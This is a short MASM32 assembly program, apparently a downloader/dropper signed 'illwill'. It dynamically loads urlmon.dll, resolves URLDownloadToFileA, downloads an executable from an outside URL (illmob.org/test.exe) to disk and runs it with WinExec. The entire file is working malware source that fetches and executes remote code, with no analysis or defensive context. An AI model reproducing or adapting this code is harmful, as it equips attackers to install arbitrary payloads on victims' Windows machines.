.386 
.model flat,stdcall 
option casemap:none 
include \masm32\include\kernel32.inc 
includelib \masm32\lib\kernel32.lib 
.data 
  UrlMonDLL    db "urlmon.dll",0 
  UrlDLFunc    db "URLDownloadToFileA",0 
  exe          db 'test.exe',0 
  web          db 'http://www.illmob.org/test.exe',0

.data? 
hLib dd ?  
FuncAddr dd ?  
;illwill : 
.code 
start: 
        invoke LoadLibrary,addr UrlMonDLL 
                mov hLib,eax 
        invoke GetProcAddress,hLib,addr UrlDLFunc 
                          mov FuncAddr,eax 
                          push 0 
                          push 0 
                          push offset exe 
                          push offset web 
                          push 0 
                          call [FuncAddr] 
        invoke FreeLibrary,hLib 
        invoke WinExec,addr exe,5 
        invoke ExitProcess,0 
end start
